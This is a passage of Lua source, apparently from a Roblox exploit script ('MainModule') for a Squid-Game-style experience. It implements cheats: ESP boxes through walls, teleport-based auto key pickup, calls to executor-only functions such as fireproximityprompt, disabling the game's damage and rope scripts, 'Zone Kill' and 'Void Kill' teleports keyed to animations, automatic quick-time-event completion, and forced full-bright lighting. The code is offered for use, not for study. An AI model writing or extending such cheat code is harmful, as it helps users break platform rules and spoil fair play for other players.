            local Players = game:GetService("Players")
            local Workspace = game:GetService("Workspace")
            local player = Players.LocalPlayer
            local ws = Workspace
            
            local effectsFolder
            repeat
                effectsFolder = ws:FindFirstChild("Effects")
                task.wait(0.1)
            until effectsFolder
            
            local espBoxes = {}
            
            local function getCurrentKeys()
                local keys = player:FindFirstChild("CurrentKeys")
                if keys then
                    return keys
                end
                
                local liveFolder = ws:FindFirstChild("Live")
                if liveFolder then
                    local playerFolder = liveFolder:FindFirstChild(player.Name)
                    if playerFolder then
                        keys = playerFolder:FindFirstChild("CurrentKeys")
                        if keys then
                            return keys
                        end
                    end
                end
                
                return nil
            end
            
            local function hasKey(keyName)
                local currentKeys = getCurrentKeys()
                if not currentKeys then
                    return false
                end
                return currentKeys:FindFirstChild(keyName) ~= nil
            end
            
            local function createESP(part)
                local box = Instance.new("BoxHandleAdornment")
                box.Name = "KeyESP"
                box.Adornee = part
                box.Size = part.Size + Vector3.new(0.5, 0.5, 0.5)
                box.Color3 = Color3.fromRGB(138, 43, 226)
                box.Transparency = 0.4
                box.AlwaysOnTop = true
                box.ZIndex = 10
                box.Parent = part
                return box
            end
            
            local function cleanupESP(obj)
                if espBoxes[obj] then
                    if espBoxes[obj] and espBoxes[obj].Parent then
                        espBoxes[obj]:Destroy()
                    end
                    espBoxes[obj] = nil
                end
            end
            
            while MainModule.KeyESPEnabled do
                for obj, box in pairs(espBoxes) do
                    if not obj or not obj.Parent then
                        cleanupESP(obj)
                    end
                end
                
                for _, obj in ipairs(effectsFolder:GetChildren()) do
                    if not MainModule.KeyESPEnabled then
                        break
                    end
                    if obj:IsA("Model") and obj.Name:match("^DroppedKey") then
                        local keyName = obj.Name:gsub("^DroppedKey", "")
                        local part = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
                        
                        if part then
                            local showESP = not hasKey(keyName)
                            
                            if showESP then
                                if not espBoxes[obj] and not part:FindFirstChild("KeyESP") then
                                    espBoxes[obj] = createESP(part)
                                end
                            else
                                cleanupESP(obj)
                                local existingESP = part:FindFirstChild("KeyESP")
                                if existingESP then
                                    existingESP:Destroy()
                                end
                            end
                        end
                    end
                end
                
                task.wait(0.25)
            end
            
            for _, esp in pairs(espBoxes) do
                if esp then
                    esp:Destroy()
                end
            end
            espBoxes = {}
        end)
    else
    end
    PlayToggleSound()
    return true
end

MainModule.AutoPickupEnabled = false

function MainModule.ToggleAutoPickup(enabled)
    if enabled then
        if not MainModule.IsGameActive("HideAndSeek") then
            MainModule.Notify("Auto Pickup", "Wait for HideAndSeek!", 0.9)
            PlayErrorSound()
            if ToggleRefs.AutoPickup then
                ToggleRefs.AutoPickup:SetValue(false)
            end
            return false
        end
    end
    
    MainModule.AutoPickupEnabled = enabled
    
    if enabled then
        task.spawn(function()
            local Players = game:GetService("Players")
            local Workspace = game:GetService("Workspace")
            local player = Players.LocalPlayer
            
            local Values = Workspace:FindFirstChild("Values")
            if not Values then return end
            local CurrentGame = Values:FindFirstChild("CurrentGame")
            if not CurrentGame or CurrentGame.Value ~= "HideAndSeek" then
                MainModule.AutoPickupEnabled = false
                if ToggleRefs.AutoPickup then
                    ToggleRefs.AutoPickup:SetValue(false)
                end
                return
            end
            
            local character = player.Character or player.CharacterAdded:Wait()
            local hrp = character:WaitForChild("HumanoidRootPart")
            
            local function getCurrentKeys()
                return player:FindFirstChild("CurrentKeys")
            end
            
            local function hasKey(keyName)
                local currentKeys = getCurrentKeys()
                return currentKeys and currentKeys:FindFirstChild(keyName) ~= nil
            end
            
            local function getMissingKeys()
                local needed = {"Circle", "Triangle", "Square"}
                local missing = {}
                for _, name in ipairs(needed) do
                    if not hasKey(name) then
                        table.insert(missing, name)
                    end
                end
                return missing
            end
            
            local function teleportTo(pos)
                if hrp and hrp.Parent then
                    hrp.CFrame = CFrame.new(pos)
                end
            end
            
            local function firePromptExecutor(prompt)
                if not prompt or not prompt:IsA("ProximityPrompt") then return false end
                
                if fireproximityprompt then
                    pcall(function() fireproximityprompt(prompt) end)
                elseif syn and syn.proximityprompt then
                    pcall(function() syn.proximityprompt(prompt) end)
                else
                    local originalDuration = prompt.HoldDuration
                    prompt.HoldDuration = 0
                    pcall(function()
                        prompt:InputHoldBegin()
                        task.wait(0.05)
                        prompt:InputHoldEnd()
                    end)
                    prompt.HoldDuration = originalDuration
                end
                return true
            end
            
            local function getAllKeysFromMap()
                local keys = {}
                local effects = Workspace:FindFirstChild("Effects")
                
                if effects then
                    for _, child in pairs(effects:GetChildren()) do
                        if child:IsA("Model") and string.find(child.Name or "", "Key") then
                            local keyName = nil
                            if string.find(child.Name, "Circle") then keyName = "Circle"
                            elseif string.find(child.Name, "Triangle") then keyName = "Triangle"
                            elseif string.find(child.Name, "Square") then keyName = "Square"
                            end
                            
                            if keyName then
                                local part = child.PrimaryPart or child:FindFirstChildWhichIsA("BasePart")
                                if part then
                                    table.insert(keys, {
                                        name = keyName,
                                        position = part.Position,
                                        model = child
                                    })
                                end
                            end
                        end
                    end
                end
                
                local hideAndSeekMap = Workspace:FindFirstChild("HideAndSeekMap")
                if hideAndSeekMap then
                    local function search(parent)
                        for _, child in pairs(parent:GetChildren()) do
                            if child:IsA("Model") then
                                local name = child.Name or ""
                                if string.find(name, "Circle") or string.find(name, "Triangle") or string.find(name, "Square") then
                                    local keyName = nil
                                    if string.find(name, "Circle") then keyName = "Circle"
                                    elseif string.find(name, "Triangle") then keyName = "Triangle"
                                    elseif string.find(name, "Square") then keyName = "Square"
                                    end
                                    
                                    if keyName then
                                        local part = child.PrimaryPart or child:FindFirstChildWhichIsA("BasePart")
                                        if part then
                                            table.insert(keys, {
                                                name = keyName,
                                                position = part.Position,
                                                model = child
                                            })
                                        end
                                    end
                                end
                            end
                            search(child)
                        end
                    end
                    search(hideAndSeekMap)
                end
                
                return keys
            end
            
            local collected = {}
            
            while MainModule.AutoPickupEnabled do
                if not MainModule.IsGameActive("HideAndSeek") then
                    break
                end
                
                if player:GetAttribute("IsHunter") == true then
                    task.wait(1)
                    continue
                end
                
                if player:FindFirstChild("Escaped") then
                    break
                end
                
                local missing = getMissingKeys()
                if #missing == 0 then
                    break
                end
                
                local allKeys = getAllKeysFromMap()
                
                for _, key in pairs(allKeys) do
                    if not MainModule.AutoPickupEnabled then break end
                    
                    if table.find(missing, key.name) and not collected[key.name] then
                        teleportTo(key.position + Vector3.new(0, 3, 0))
                        task.wait(0.1)
                        
                        local prompt = nil
                        if key.model then
                            prompt = key.model:FindFirstChildOfClass("ProximityPrompt")
                            if not prompt then
                                for _, desc in pairs(key.model:GetDescendants()) do
                                    if desc:IsA("ProximityPrompt") then
                                        prompt = desc
                                        break
                                    end
                                end
                            end
                        end
                        
                        if prompt then
                            firePromptExecutor(prompt)
                            collected[key.name] = true
                            PlayBell()
                        end
                        
                        task.wait(0.3)
                    end
                end
                
                task.wait(0.5)
            end
            
            MainModule.AutoPickupEnabled = false
            if ToggleRefs.AutoPickup then
                ToggleRefs.AutoPickup:SetValue(false)
            end
        end)
    else
    end
    PlayToggleSound()
    return true
end

MainModule.ShowSpikesEnabled = false

MainModule.ToggleShowSpikes = function(enabled)
    MainModule.ShowSpikesEnabled = enabled
    if enabled then
    else
    end
    PlayToggleSound()
end

MainModule.FreezeRopeEnabled = false
MainModule.FreezeRopeConnection = nil

MainModule.ToggleFreezeRope = function(enabled)
    MainModule.FreezeRopeEnabled = enabled
    
    local rope = workspace:FindFirstChild("Effects") and workspace.Effects:FindFirstChild("rope")
    if not rope then
        if ToggleRefs.FreezeRope then
            pcall(function() ToggleRefs.FreezeRope:SetValue(false) end)
        end
        return
    end
    
    if enabled then
        for _, part in ipairs(rope:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = true
                part.Velocity = Vector3.zero
                part.RotVelocity = Vector3.zero
            elseif part:IsA("Constraint") or part:IsA("RopeConstraint") or part:IsA("Motor6D") then
                part.Enabled = false
            end
        end
    else
        for _, part in ipairs(rope:GetDescendants()) do
            if part:IsA("BasePart") then
                part.Anchored = false
            elseif part:IsA("Constraint") or part:IsA("RopeConstraint") or part:IsA("Motor6D") then
                part.Enabled = true
            end
        end
    end
    
    PlayToggleSound()
end

MainModule.RemoveBalanceMiniGame = function()
    local playingJumpRope = LocalPlayer:FindFirstChild("PlayingJumpRope")
    if playingJumpRope then
        pcall(function() playingJumpRope:Destroy() end)
        PlayBell()
    else
        MainModule.Notify("Jump Rope", "PlayingJumpRope not found", 0.9)
        PlayErrorSound()
    end
end

MainModule.AutoJumpEnabled = false
MainModule.AutoJumpLoop = nil

MainModule.ToggleAutoJump = function(enabled)
    MainModule.AutoJumpEnabled = enabled
    
    if MainModule.AutoJumpLoop then
        task.cancel(MainModule.AutoJumpLoop)
        MainModule.AutoJumpLoop = nil
    end
    
    if enabled then
        MainModule.AutoJumpLoop = task.spawn(function()
            while MainModule.AutoJumpEnabled do
                local rope = workspace:FindFirstChild("Effects") and workspace.Effects:FindFirstChild("rope")
                local character = MainModule.GetCharacter()
                
                if rope and character then
                    local rootPart = MainModule.GetRootPart(character)
                    if rootPart and (rootPart.Position - rope.Position).Magnitude <= 15 then
                        local humanoid = MainModule.GetHumanoid(character)
                        if humanoid and humanoid.Health > 0 then
                            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                        end
                    end
                end
                task.wait(1)
            end
        end)
    else
    end
    
    PlayToggleSound()
end

MainModule.JumpRopeAntiHit = {
    Enabled = false,
    Connection = nil,
    AnimationId = "rbxassetid://105677261748140",
    AnimationDuration = 0.4,
    CurrentAnimation = nil,
    StopTimer = nil,
    WasJumping = false,
    RopeDestroyed = false
}

MainModule.JumpRopeFakeBalance = {
    Enabled = false,
    Connection = nil,
    AnimationId = "rbxassetid://105677261748140",
    AnimationDuration = 0.4,
    CurrentAnimation = nil,
    StopTimer = nil,
    WasJumping = false
}

function MainModule.PlayLandAnimationFakeBalance()
    if not MainModule.JumpRopeFakeBalance.Enabled then return end
    
    local character = MainModule.GetCharacter()
    if not character then return end
    
    local humanoid = MainModule.GetHumanoid(character)
    if not humanoid then return end
    
    if MainModule.JumpRopeFakeBalance.CurrentAnimation then
        pcall(function() MainModule.JumpRopeFakeBalance.CurrentAnimation:Stop() end)
    end

    if MainModule.JumpRopeFakeBalance.StopTimer then
        MainModule.JumpRopeFakeBalance.StopTimer:Disconnect()
        MainModule.JumpRopeFakeBalance.StopTimer = nil
    end

    local anim = Instance.new("Animation")
    anim.AnimationId = MainModule.JumpRopeFakeBalance.AnimationId
    MainModule.JumpRopeFakeBalance.CurrentAnimation = humanoid:LoadAnimation(anim)
    pcall(function() MainModule.JumpRopeFakeBalance.CurrentAnimation:Play() end)

    MainModule.JumpRopeFakeBalance.StopTimer = game:GetService("RunService").Stepped:Connect(function()
        task.wait(MainModule.JumpRopeFakeBalance.AnimationDuration)
        if MainModule.JumpRopeFakeBalance.CurrentAnimation then
            pcall(function() MainModule.JumpRopeFakeBalance.CurrentAnimation:Stop() end)
            MainModule.JumpRopeFakeBalance.CurrentAnimation = nil
        end
        if MainModule.JumpRopeFakeBalance.StopTimer then
            MainModule.JumpRopeFakeBalance.StopTimer:Disconnect()
            MainModule.JumpRopeFakeBalance.StopTimer = nil
        end
    end)
end

function MainModule.SetupJumpRopeFakeBalance()
    local character = MainModule.GetCharacter()
    if not character then return end
    
    local humanoid = MainModule.GetHumanoid(character)
    if not humanoid then return end
    
    MainModule.JumpRopeFakeBalance.WasJumping = false
    
    humanoid.StateChanged:Connect(function(oldState, newState)
        if not MainModule.JumpRopeFakeBalance.Enabled then return end
        
        if newState == Enum.HumanoidStateType.Jumping then
            MainModule.JumpRopeFakeBalance.WasJumping = true
        end
        
        if MainModule.JumpRopeFakeBalance.WasJumping and (newState == Enum.HumanoidStateType.Running or 
           newState == Enum.HumanoidStateType.Landed or
           newState == Enum.HumanoidStateType.GettingUp) then
            MainModule.PlayLandAnimationFakeBalance()
            MainModule.JumpRopeFakeBalance.WasJumping = false
        end
    end)
end

function MainModule.ToggleJumpRopeFakeBalance(enabled)
    local toggleRef = ToggleRefs.JumpRopeFakeBalance
    
    if enabled then
        if not MainModule.CanEnableToggle("JumpRope", "Fake Balance", toggleRef) then
            return false
        end
    end
    
    if MainModule.JumpRopeFakeBalance.Connection then
        MainModule.JumpRopeFakeBalance.Connection:Disconnect()
        MainModule.JumpRopeFakeBalance.Connection = nil
    end
    
    if MainModule.JumpRopeFakeBalance.CurrentAnimation then
        pcall(function() MainModule.JumpRopeFakeBalance.CurrentAnimation:Stop() end)
        MainModule.JumpRopeFakeBalance.CurrentAnimation = nil
    end
    
    if MainModule.JumpRopeFakeBalance.StopTimer then
        MainModule.JumpRopeFakeBalance.StopTimer:Disconnect()
        MainModule.JumpRopeFakeBalance.StopTimer = nil
    end
    
    MainModule.JumpRopeFakeBalance.Enabled = enabled
    
    if enabled then
        MainModule.SetupJumpRopeFakeBalance()
        
        MainModule.JumpRopeFakeBalance.Connection = RunService.Heartbeat:Connect(function()
            if not MainModule.JumpRopeFakeBalance.Enabled then return end
            
            if not MainModule.IsGameActive("JumpRope") then
                if ToggleRefs.JumpRopeFakeBalance then
                    pcall(function() ToggleRefs.JumpRopeFakeBalance:SetValue(false) end)
                end
                MainModule.ToggleJumpRopeFakeBalance(false)
                return
            end
        end)
    end
    
    PlayToggleSound()
    return true
end

function MainModule.DisableRopeObjects(obj)
    if not obj then return end
    
    pcall(function()
        if obj:IsA("MeshPart") or obj:IsA("Part") or obj:IsA("BasePart") then
            obj.CanCollide = false
            obj.CanTouch = false
            obj.CanQuery = false
            obj.Massless = true
            
            if obj.TouchTransmitter then
                obj.TouchTransmitter:Destroy()
            end
        end
        
        if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
            local name = obj.Name:lower()
            if name:find("rope") or name:find("jump") or name:find("carry") or name:find("damage") or name:find("hurt") then
                obj.Disabled = true
            end
        end
        
        if obj:IsA("RopeConstraint") then
            obj:Destroy()
        end
        
        local name = obj.Name or ""
        if name == "PlayingJumpRope" or name == "RopeCarryPrompt" then
            obj:Destroy()
        end
    end)
end

function MainModule.SearchAndDestroyRope(parent)
    if not parent then return end
    for _, obj in pairs(parent:GetDescendants()) do
        if obj.Name and obj.Name:lower():find("rope") then
            MainModule.DisableRopeObjects(obj)
        end
        if obj:IsA("RopeConstraint") then
            MainModule.DisableRopeObjects(obj)
        end
        if obj.Name == "PlayingJumpRope" or obj.Name == "RopeCarryPrompt" then
            MainModule.DisableRopeObjects(obj)
        end
    end
end

function MainModule.DestroyAllRopes()
    MainModule.SearchAndDestroyRope(workspace)
    
    pcall(function()
        MainModule.SearchAndDestroyRope(game:GetService("ReplicatedStorage"))
    end)
    
    pcall(function()
        MainModule.SearchAndDestroyRope(game:GetService("ServerStorage"))
    end)
    
    pcall(function()
        MainModule.SearchAndDestroyRope(game:GetService("ServerScriptService"))
    end)
    
    pcall(function()
        for _, player in pairs(Players:GetPlayers()) do
            if player.Character then
                MainModule.SearchAndDestroyRope(player.Character)
            end
            if player.PlayerGui then
                MainModule.SearchAndDestroyRope(player.PlayerGui)
            end
        end
    end)
    
    MainModule.JumpRopeAntiHit.RopeDestroyed = true
end

function MainModule.DisableDamageScripts()
    pcall(function()
        local replicatedStorage = game:GetService("ReplicatedStorage")
        for _, obj in pairs(replicatedStorage:GetDescendants()) do
            if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                local name = obj.Name:lower()
                if name:find("rope") or name:find("jump") or name:find("carry") or name:find("damage") or name:find("hurt") then
                    obj.Disabled = true
                end
            end
        end
    end)
    
    pcall(function()
        local serverStorage = game:GetService("ServerStorage")
        for _, obj in pairs(serverStorage:GetDescendants()) do
            if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                local name = obj.Name:lower()
                if name:find("rope") or name:find("jump") or name:find("carry") or name:find("damage") or name:find("hurt") then
                    obj.Disabled = true
                end
            end
        end
    end)
    
    pcall(function()
        local serverScriptService = game:GetService("ServerScriptService")
        for _, obj in pairs(serverScriptService:GetDescendants()) do
            if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                local name = obj.Name:lower()
                if name:find("rope") or name:find("jump") or name:find("carry") or name:find("damage") or name:find("hurt") then
                    obj.Disabled = true
                end
            end
        end
    end)
end

function MainModule.ToggleJumpRopeAntiHit(enabled)
    local toggleRef = ToggleRefs.JumpRopeAntiHit
    
    if enabled then
        if not MainModule.CanEnableToggle("JumpRope", "AntiHit", toggleRef) then
            return false
        end
    end
    
    if MainModule.JumpRopeAntiHit.Connection then
        MainModule.JumpRopeAntiHit.Connection:Disconnect()
        MainModule.JumpRopeAntiHit.Connection = nil
    end
    
    MainModule.JumpRopeAntiHit.Enabled = enabled
    MainModule.JumpRopeAntiHit.RopeDestroyed = false
    
    if enabled then
        MainModule.DisableDamageScripts()
        MainModule.DestroyAllRopes()
        
        MainModule.JumpRopeAntiHit.Connection = RunService.Heartbeat:Connect(function()
            if not MainModule.JumpRopeAntiHit.Enabled then return end
            
            if not MainModule.IsGameActive("JumpRope") then
                if ToggleRefs.JumpRopeAntiHit then
                    pcall(function() ToggleRefs.JumpRopeAntiHit:SetValue(false) end)
                end
                MainModule.ToggleJumpRopeAntiHit(false)
                return
            end
            
            if not MainModule.JumpRopeAntiHit.RopeDestroyed then
                MainModule.DestroyAllRopes()
            end
        end)
    end
    
    PlayToggleSound()
    return true
end

ToggleRefs.JumpRopeAntiHit = nil
ToggleRefs.JumpRopeFakeBalance = nil

MainModule.ZoneKillFeature = {
    Enabled = false,
    AnimationId = "rbxassetid://105341857343164",
    ZonePosition = Vector3.new(197.7, 54.6, -96.3),
    ReturnDelay = 0.6,
    SavedCFrame = nil,
    ActiveAnimation = false,
    AnimationStartTime = 0,
    AnimationConnection = nil,
    CharacterAddedConnection = nil,
    AnimationStoppedConnections = {},
    AnimationCheckConnection = nil,
    TrackedAnimations = {}
}

function MainModule.ToggleZoneKill(enabled)
    local toggleRef = ToggleRefs.ZoneKill
    
    if enabled then
        if not MainModule.CanEnableToggle("LastDinner", "Zone Kill", toggleRef) then
            return false
        end
    end
    
    MainModule.ZoneKillFeature.Enabled = enabled
    
    if MainModule.ZoneKillFeature.AnimationConnection then
        MainModule.ZoneKillFeature.AnimationConnection:Disconnect()
        MainModule.ZoneKillFeature.AnimationConnection = nil
    end
    if MainModule.ZoneKillFeature.CharacterAddedConnection then
        MainModule.ZoneKillFeature.CharacterAddedConnection:Disconnect()
        MainModule.ZoneKillFeature.CharacterAddedConnection = nil
    end
    if MainModule.ZoneKillFeature.AnimationCheckConnection then
        MainModule.ZoneKillFeature.AnimationCheckConnection:Disconnect()
        MainModule.ZoneKillFeature.AnimationCheckConnection = nil
    end
    
    for _, conn in ipairs(MainModule.ZoneKillFeature.AnimationStoppedConnections) do
        pcall(function() conn:Disconnect() end)
    end
    MainModule.ZoneKillFeature.AnimationStoppedConnections = {}
    
    MainModule.ZoneKillFeature.SavedCFrame = nil
    MainModule.ZoneKillFeature.ActiveAnimation = false
    MainModule.ZoneKillFeature.AnimationStartTime = 0
    MainModule.ZoneKillFeature.TrackedAnimations = {}
    
    if not enabled then
        PlayToggleSound()
        return true
    end
    
    local function checkAnimations()
        if not MainModule.ZoneKillFeature.Enabled then return end
        
        local character = MainModule.GetCharacter()
        if not character then return end
        local humanoid = MainModule.GetHumanoid(character)
        if not humanoid then return end
        
        local activeTracks = humanoid:GetPlayingAnimationTracks()
        for _, track in pairs(activeTracks) do
            if track and track.Animation then
                local animId = track.Animation.AnimationId
                
                if animId and animId == MainModule.ZoneKillFeature.AnimationId then
                    local trackKey = animId .. "_" .. tostring(track)
                    if not MainModule.ZoneKillFeature.TrackedAnimations[trackKey] then
                        MainModule.ZoneKillFeature.TrackedAnimations[trackKey] = true
                        
                        if not MainModule.ZoneKillFeature.ActiveAnimation then
                            MainModule.ZoneKillFeature.ActiveAnimation = true
                            MainModule.ZoneKillFeature.AnimationStartTime = tick()
                            
                            MainModule.ZoneKillFeature.SavedCFrame = character:GetPrimaryPartCFrame()
                            character:SetPrimaryPartCFrame(CFrame.new(MainModule.ZoneKillFeature.ZonePosition))
                            
                            local stoppedConn = track.Stopped:Connect(function()
                                task.wait(MainModule.ZoneKillFeature.ReturnDelay)
                                
                                if MainModule.ZoneKillFeature.SavedCFrame then
                                    character:SetPrimaryPartCFrame(MainModule.ZoneKillFeature.SavedCFrame)
                                    MainModule.ZoneKillFeature.SavedCFrame = nil
                                    MainModule.ZoneKillFeature.ActiveAnimation = false
                                    MainModule.ZoneKillFeature.TrackedAnimations = {}
                                end
                            end)
                            table.insert(MainModule.ZoneKillFeature.AnimationStoppedConnections, stoppedConn)
                        end
                    end
                end
            end
        end
    end
    
    local function setupCharacter(char)
        local humanoid = char:WaitForChild("Humanoid", 5)
        if not humanoid then return end
        
        MainModule.ZoneKillFeature.AnimationConnection = humanoid.AnimationPlayed:Connect(function(track)
            if not MainModule.ZoneKillFeature.Enabled then return end
            
            if track and track.Animation then
                local animId = track.Animation.AnimationId
                
                if animId and animId == MainModule.ZoneKillFeature.AnimationId then
                    local trackKey = animId .. "_" .. tostring(track)
                    MainModule.ZoneKillFeature.TrackedAnimations[trackKey] = true
                    
                    if not MainModule.ZoneKillFeature.ActiveAnimation then
                        MainModule.ZoneKillFeature.ActiveAnimation = true
                        MainModule.ZoneKillFeature.AnimationStartTime = tick()
                        
                        MainModule.ZoneKillFeature.SavedCFrame = char:GetPrimaryPartCFrame()
                        char:SetPrimaryPartCFrame(CFrame.new(MainModule.ZoneKillFeature.ZonePosition))
                        
                        local stoppedConn = track.Stopped:Connect(function()
                            task.wait(MainModule.ZoneKillFeature.ReturnDelay)
                            
                            if MainModule.ZoneKillFeature.SavedCFrame then
                                char:SetPrimaryPartCFrame(MainModule.ZoneKillFeature.SavedCFrame)
                                MainModule.ZoneKillFeature.SavedCFrame = nil
                            end
                            
                            MainModule.ZoneKillFeature.ActiveAnimation = false
                            MainModule.ZoneKillFeature.TrackedAnimations = {}
                        end)
                        
                        table.insert(MainModule.ZoneKillFeature.AnimationStoppedConnections, stoppedConn)
                    end
                end
            end
        end)
    end
    
    local char = LocalPlayer.Character
    if char then
        setupCharacter(char)
    end
    
    MainModule.ZoneKillFeature.CharacterAddedConnection = LocalPlayer.CharacterAdded:Connect(function(newChar)
        task.wait(1)
        setupCharacter(newChar)
    end)
    
    MainModule.ZoneKillFeature.AnimationCheckConnection = RunService.Heartbeat:Connect(function()
        if not MainModule.ZoneKillFeature.Enabled then return end
        checkAnimations()
    end)
    
    PlayToggleSound()
    return true
end


MainModule.VoidKillEnabled = false
MainModule.VoidKillConn = nil
MainModule.VoidKillCharConn = nil
MainModule.VoidAnimIds = {"rbxassetid://107989020363293","rbxassetid://71619354165195"}
MainModule.VoidZonePos = Vector3.new(-95.1,964.6,67.6)

MainModule.ToggleVoidKill = function(enabled)
    local toggleRef = ToggleRefs.VoidKill
    
    if enabled then
        if not MainModule.CanEnableToggle("SkySquidGame", "Void Kill", toggleRef) then
            return false
        end
    end
    
    if MainModule.VoidKillConn then MainModule.VoidKillConn:Disconnect() end
    if MainModule.VoidKillCharConn then MainModule.VoidKillCharConn:Disconnect() end
    MainModule.VoidKillEnabled = enabled
    if enabled then
        local function setup(char)
            local h = char:WaitForChild("Humanoid")
            MainModule.VoidKillConn = h.AnimationPlayed:Connect(function(track)
                if track.Animation and table.find(MainModule.VoidAnimIds, track.Animation.AnimationId) then
                    local orig = char:GetPrimaryPartCFrame()
                    local platform = Instance.new("Part")
                    platform.Name = "VoidKillAntiFall"
                    platform.Size = Vector3.new(10,1,10)
                    platform.Position = MainModule.VoidZonePos + Vector3.new(0,-4,0)
                    platform.Anchored = true
                    platform.CanCollide = true
                    platform.Transparency = 1
                    platform.Parent = workspace
                    char:SetPrimaryPartCFrame(CFrame.new(MainModule.VoidZonePos.X, MainModule.VoidZonePos.Y, MainModule.VoidZonePos.Z))
                    track.Stopped:Connect(function()
                        task.wait(1)
                        if orig then char:SetPrimaryPartCFrame(orig) end
                        platform:Destroy()
                    end)
                end
            end)
        end
        if LocalPlayer.Character then setup(LocalPlayer.Character) end
        MainModule.VoidKillCharConn = LocalPlayer.CharacterAdded:Connect(function(char) task.wait(1); setup(char) end)
    else
    end
    PlayToggleSound()
    return true
end

MainModule.MingleVoidKillEnabled = false
MainModule.MingleConns = {}
MainModule.MingleAnimId = "rbxassetid://71318091779666"

MainModule.ToggleMingleVoidKill = function(enabled)
    local toggleRef = ToggleRefs.MingleVoidKill
    
    if enabled then
        if not MainModule.CanEnableToggle("Mingle", "Void Kill", toggleRef) then
            return false
        end
    end
    
    for _,c in pairs(MainModule.MingleConns) do pcall(function() c:Disconnect() end) end
    MainModule.MingleConns = {}
    MainModule.MingleVoidKillEnabled = enabled
    if enabled then
        local platform = nil
        local origPos = nil
        local function setup(char)
            local h = char:WaitForChild("Humanoid")
            local conn = h.AnimationPlayed:Connect(function(track)
                if track.Animation and track.Animation.AnimationId == MainModule.MingleAnimId then
                    local rp = char:FindFirstChild("HumanoidRootPart")
                    if rp then
                        origPos = rp.Position
                        if platform then platform:Destroy() end
                        platform = Instance.new("Part")
                        platform.Name = "MingleSafetyPlatform"
                        platform.Size = Vector3.new(100,10,100)
                        platform.Position = Vector3.new(origPos.X, origPos.Y-30, origPos.Z)
                        platform.Anchored = true
                        platform.CanCollide = true
                        platform.Transparency = 0.8
                        platform.Color = Color3.fromRGB(0,170,255)
                        platform.Material = Enum.Material.Neon
                        platform.Parent = workspace
                        rp.CFrame = CFrame.new(platform.Position.X, platform.Position.Y+3, platform.Position.Z)
                        track.Stopped:Connect(function()
                            task.wait(0.6)
                            if origPos then rp.CFrame = CFrame.new(origPos) end
                            if platform then platform:Destroy(); platform=nil end
                        end)
                    end
                end
            end)
            table.insert(MainModule.MingleConns, conn)
        end
        if LocalPlayer.Character then setup(LocalPlayer.Character) end
        table.insert(MainModule.MingleConns, LocalPlayer.CharacterAdded:Connect(function(char) task.wait(1); setup(char) end))
    else
    end
    PlayToggleSound()
    return true
end

MainModule.AutoChokeEnabled = false
MainModule.AutoChokeConnection = nil

MainModule.ToggleAutoChoke = function(enabled)
    local toggleRef = ToggleRefs.AutoChoke
    
    if enabled then
        if not MainModule.CanEnableToggle("Mingle", "Auto Choke", toggleRef) then
            return false
        end
    end
    
    MainModule.AutoChokeEnabled = enabled
    if enabled then
        local ImpactFrames = LocalPlayer.PlayerGui:FindFirstChild("ImpactFrames")
        if ImpactFrames then
            local processed = {}
            ImpactFrames.ChildAdded:Connect(function(outer)
                if outer.Name ~= "OuterRingTemplate" or processed[outer] then return end
                processed[outer] = true
                task.defer(function()
                    local inner = nil
                    for _, g in pairs(ImpactFrames:GetChildren()) do
                        if g.Name == "InnerTemplate" and g.Position == outer.Position and not g:GetAttribute("Failed") then
                            inner = g; break
                        end
                    end
                    if not inner or inner:GetAttribute("Tweening") or inner:GetAttribute("Failed") then return end
                    local HBGQTE = require(ReplicatedStorage.Modules.HBGQTE)
                    pcall(function() HBGQTE.Pressed(false, {Inner=inner, Outer=outer, Duration=2, StartedAt=tick(), Data={}}) end)
                end)
            end)
        end
    else
    end
    PlayToggleSound()
    return true
end

MainModule.SkySquidAntiFall = {Enabled=false, Platform=nil, Conn=nil}

MainModule.ToggleSkySquidAntiFall = function(enabled)
    if MainModule.SkySquidAntiFall.Conn then MainModule.SkySquidAntiFall.Conn:Disconnect() end
    if MainModule.SkySquidAntiFall.Platform then MainModule.SkySquidAntiFall.Platform:Destroy() end
    MainModule.SkySquidAntiFall.Enabled = enabled
    if enabled then
        local function create()
            local c = MainModule.GetCharacter()
            if not c then return nil end
            local rp = MainModule.GetRootPart(c)
            if not rp then return nil end
            local p = Instance.new("Part")
            p.Name = "SkySquidAntiFall"
            p.Size = Vector3.new(10000,1,10000)
            p.Position = Vector3.new(rp.Position.X, rp.Position.Y-5, rp.Position.Z)
            p.Anchored = true
            p.CanCollide = true
            p.Transparency = 1
            p.Parent = workspace
            return p
        end
        MainModule.SkySquidAntiFall.Platform = create()
        MainModule.SkySquidAntiFall.Conn = RunService.Heartbeat:Connect(function()
            if not MainModule.SkySquidAntiFall.Enabled then return end
            if not (MainModule.SkySquidAntiFall.Platform and MainModule.SkySquidAntiFall.Platform.Parent) then
                MainModule.SkySquidAntiFall.Platform = create()
            end
        end)
    else
    end
    PlayToggleSound()
    return true
end

MainModule.FullbrightEnabled = false
MainModule.FullbrightSettings = {}
MainModule.FullbrightConnection = nil

MainModule.ToggleFullbright = function(enabled)
    MainModule.FullbrightEnabled = enabled
    local Lighting = game:GetService("Lighting")
    
    if enabled then
        MainModule.FullbrightSettings.Brightness = Lighting.Brightness
        MainModule.FullbrightSettings.ClockTime = Lighting.ClockTime
        MainModule.FullbrightSettings.FogEnd = Lighting.FogEnd
        MainModule.FullbrightSettings.GlobalShadows = Lighting.GlobalShadows
        MainModule.FullbrightSettings.OutdoorAmbient = Lighting.OutdoorAmbient
        MainModule.FullbrightSettings.Ambient = Lighting.Ambient
        
        Lighting.Brightness = 2
        Lighting.ClockTime = 14
        Lighting.FogEnd = 100000
        Lighting.GlobalShadows = false
        Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
        Lighting.Ambient = Color3.fromRGB(255, 255, 255)
        
        if MainModule.FullbrightConnection then
            MainModule.FullbrightConnection:Disconnect()
        end
        
        MainModule.FullbrightConnection = Lighting.Changed:Connect(function(property)
            if not MainModule.FullbrightEnabled then return end
            Lighting.Brightness = 2
            Lighting.ClockTime = 14
            Lighting.FogEnd = 100000
            Lighting.GlobalShadows = false
